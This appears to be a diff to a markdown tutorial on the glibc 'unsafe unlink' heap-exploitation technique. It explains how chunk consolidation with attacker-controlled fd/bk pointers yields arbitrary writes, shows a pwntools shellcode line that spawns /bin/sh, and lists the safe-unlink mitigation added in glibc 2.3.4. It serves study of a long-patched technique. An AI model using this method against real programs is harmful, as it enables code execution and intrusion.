@@ -3,7 +3,7 @@
 The goal is to clear the next chunk's prev in use flag in order to trigger a consolidation of 2 chunks when freeing.
 We then need to control the fd and bk pointers of the consolidated chunks to trigger 2 arbitrary writes.
 
-When free unlink our first chunk during consolidation, it follows the backward pointer and update its forward pointer, and does the opposit to the forward pointer, like a regular unlink.
+When free unlink our first chunk during consolidation, it follows the forward pointer and update its backward pointer, and does the opposit to the forward pointer, like a regular double-linked list unlink.
 
 ```c
 chunk->fd->bk = chunk->bk;
@@ -12,14 +12,16 @@ chunk->bk->fd = chunk->fd;
 
 bk being at offset 0x18 and fd at offset 0x10 in the chunk structure.
 
-It looks like this in assembly:
-rax = fd
+The primitive looks like this in gdb:
+
+**rax = fd**
 ![rax](./media/rax.png)
-rdx = bk
+
+**rdx = bk**
 ![rdx](./media/rdx.png)
 
 
-#### Exploit example
+### Exploit example
 ```python
 shellcode = asm("jmp shellcode;" + "nop;"*0x16 + "shellcode:" + shellcraft.execve("/bin/sh"))
 
@@ -41,4 +43,14 @@ free(chunk_a)
 
 ```
 
+
+## Side note
+
+The unsorted bin, during malloc, does a *partial* unlinking, following the victim's chunk backward pointer and updating its forward pointer to the bim's head.
+
 ## Mitigation
+
+|GLIBC VERSION|PATCHES|
+|---|---|
+|2.3.4|Added [[Safe unlink]]|
+
